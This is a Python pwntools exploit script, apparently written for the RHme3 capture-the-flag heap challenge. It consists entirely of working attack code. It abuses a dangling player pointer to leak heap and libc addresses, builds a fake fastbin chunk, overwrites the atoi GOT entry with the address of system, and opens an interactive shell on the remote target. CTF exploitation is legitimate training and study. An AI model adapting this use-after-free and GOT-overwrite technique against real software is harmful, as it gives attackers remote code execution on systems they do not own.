#!/usr/bin/env python

from pwn import *
import sys

HOST="127.0.0.1"
#HOST="pwn.rhme.riscure.com"
PORT="1337"

def add_player(Name, attack, defense, speed, precision):
	r.sendline("1")
	r.sendlineafter("name:", str(Name))
	r.sendlineafter("points:", str(attack))
	r.sendlineafter("points:", str(defense))
	r.sendlineafter("speed:", str(speed))
	r.sendlineafter("precision:", str(precision))
	r.recvuntil("choice:")

def select_player(index):
	r.sendline("3")
	r.sendlineafter("index:", str(index))
	r.recvuntil("choice:")

def remove_player(index):
	r.sendline("2")
	r.sendlineafter("index:", str(index))
	r.recvuntil("choice:")

def edit_player_name(Name):
	r.sendline("4")	# Enter edit menu
	r.sendlineafter("choice:", str(1))	# 1. Edit name 
	r.sendlineafter("name:", str(Name))
	r.sendlineafter("choice:", str(0))	# 0 - Go back
	r.recvuntil("choice:")

def edit_player_attack(value):
	r.sendline("4") # Enter edit menu
	r.sendlineafter("choice:", str(2))	# 2. Attack points
	r.sendlineafter("points:", str(value))
	r.sendlineafter("choice:", str(0))	# 0 - Go back
	r.recvuntil("choice:")

def edit_player_defense(value):
	r.sendline("4") # Enter edit menu
	r.sendlineafter("choice:", str(3))	# 3. Defense points
	r.sendlineafter("points:", str(value))
	r.sendlineafter("choice:", str(0))	# 0 - Go back
	r.recvuntil("choice:")

def edit_player_speed(value):
	r.sendline("4") # Enter edit menu
	r.sendlineafter("choice:", str(4))	# 4. speed
	r.sendlineafter("speed:", str(value))
	r.sendlineafter("choice:", str(0))	# 0 - Go back
	r.recvuntil("choice:")

def edit_player_precision(value):
	r.sendline("4") # Enter edit menu
	r.sendlineafter("choice:", str(5))	# 5. precision
	r.sendlineafter("precision:", str(value))
	r.sendlineafter("choice:", str(0))	# 0 - Go back
	r.recvuntil("choice:")

def show_player_name():
	r.sendline("5")
	data = r.recvline()
	r.recvuntil("choice:")

	return data

def show_player_stats():
	r.sendline("5")
	data = r.recvline() # Name
	data = r.recvline() # stats

	r.recvuntil("choice:")

	return data

def exploit(r):
	r.recvuntil("choice:")


# FASTBIN ATTACK

	log.info("Add playerA")
	add_player("A"*200, 1, 1, 1, 1)

	log.info("Add playerB")
	add_player("B"*200, 2, 2, 2, 2)

	log.info("Add playerC")
	add_player("C"*200, 3, 3, 3, 3)


	log.info("Select playerA")
	select_player(0)


	log.info("Remove playerB")
	remove_player(1)

	log.info("Remove playerA")
	remove_player(0)

	HEAPLEAK = int(show_player_stats().split(": ")[1].split(",")[0], 10)
	log.info("HEAP Leak 	: %s" % hex(HEAPLEAK))

	LIBCLEAK = u64(show_player_name()[8:8+6] + "\x00\x00")
	log.info("LIBC Leak 	: %s" % hex(LIBCLEAK))

#	LIBC calculation for rhme3
#	LIBC = LIBCLEAK - 0x3c4b78

#	LIBC calculation local
	LIBC = LIBCLEAK - 0x398b58
	log.info("LIBC BASE 	: %s" % hex(LIBC))

	log.info("Remove PlayerC")
	remove_player(2)

	log.info("Add Player F")
	add_player("F"*16, 5, 5, 5, 5)

	log.info("Select Player F => dangling pointer")
	select_player(0)

	log.info("Add Player G")
	add_player("G"*16, 6, 6, 6, 6)

	log.info("Remove Player F => 2 chunks put on fastbin")
	remove_player(0)

	log.info("Create fake chunk in the Player G region. Align on 0x8")
	edit_player_name(p64(HEAPLEAK+0x8) + p64(0x4949494949494949))

	log.info("Select Player G")
	select_player(1)

	log.info("Overwrite Player G data for proper size and null FD ")
	edit_player_attack(33)
	edit_player_defense(0)
	edit_player_speed(0)
	edit_player_precision(0)
	# Now there are 3 chunks in the fastbin

	log.info("Add Player H => Remove 1 chunk from fastbin")
	# Large name 0x60 will remove only 1 chunk from fastbin and store name in unsorted
	add_player("H"*0x60, 7, 7, 7, 7)

	log.info("Add Player => remove 2 chunks from fastbin")
	# ATOI GOT 0x603110
	add_player("IIIIIIII" + p64(0x603110), 8, 8, 8, 8)
	# LOCAL libc
	SYSTEM = LIBC + 0x3f450

	log.info("Edit Player => Write the system to atoi GOT")
	# RHME3 LIBC
	#SYSTEM = LIBC + 0x19370
	edit_player_name(p64(SYSTEM))
	r.sendline("sh")

	r.interactive()


	return


if __name__ == "__main__":
	r = remote(HOST, PORT)
	pause()
	exploit(r)